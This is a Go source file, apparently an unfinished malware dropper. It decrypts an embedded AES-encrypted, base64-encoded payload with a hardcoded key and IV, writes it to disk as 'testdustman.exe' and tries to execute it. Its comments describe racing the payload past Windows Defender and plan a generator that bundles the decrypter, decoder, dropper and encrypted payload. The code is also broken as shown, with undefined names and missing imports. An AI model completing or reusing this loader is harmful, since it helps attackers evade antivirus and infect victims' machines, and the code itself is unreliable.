package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
)

key := []byte("7bBjcqGgs7nbgejLJpV22CLjqmUdHDdF")
iv := []byte("PXBaKTFr8HJycSUc")



func decrypt(key []byte, iv []byte, cryptoText string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(cryptoText)

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	// The IV needs to be unique, but not secure. Therefore it's common to
	// include it at the beginning of the ciphertext.
	if len(ciphertext) < aes.BlockSize {
		panic("ciphertext too short")
	}
	ciphertext = ciphertext[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)

	// XORKeyStream can work in-place if the two arguments are the same.
	stream.XORKeyStream(ciphertext, ciphertext)

	return fmt.Sprintf("%s", ciphertext)
}


func main() {

	// decrypter code
	payloadDecrypted := decrypt(key, iv, cryptoText)
	fmt.Printf(payloadDecrypted)

	// So now a workaround is to make a "dropper" that writes a new file and then executes it. This does violate the in-memory execution method, which means it's a race-condition to set off the payload before Windows Defender stops it

	// We need the following things in the new go file
	// the key and IV - DONE
	// the f.write module - DONE
	decodedPayload, _ := base64.StdEncoding.DecodeString(payloadDecrypted)
	// proven it works, it matches the original payload, now write to a temp file and check if it matches the hash of Dustman.exe
	fmt.Printf(byteToString(decodedPayload))

	// base64 decoder - DONE
	// writer/dropper module
	ioutil.WriteFile("./testdustman.exe", decodedPayload, 0777)
	check(err)
	exec.Command("./testdustman.exe")
	// Now we need the standalone generator that contains the decrypter, decoder, and dropper. and encoded + encrypted payload
	
}
